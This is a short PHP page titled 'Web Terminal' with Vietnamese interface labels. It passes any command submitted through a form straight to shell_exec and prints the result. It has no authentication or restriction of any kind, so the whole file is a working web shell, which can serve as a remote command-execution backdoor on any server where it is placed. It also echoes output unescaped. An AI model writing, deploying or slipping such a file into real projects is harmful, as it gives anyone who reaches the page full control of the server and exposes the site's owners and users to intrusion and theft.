<?php
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd);
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Web Terminal</title>
</head>
<body>
    <h1>Web Terminal</h1>
    <form method="post" action="">
        <label for="cmd">Nhập câu lệnh:</label>
        <input type="text" name="cmd" id="cmd">
        <button type="submit">Thực thi</button>
    </form>

    <?php if (isset($output)) : ?>
        <h2>Kết quả:</h2>
        <pre><?php echo $output; ?></pre>
    <?php endif; ?>
</body>
</html>
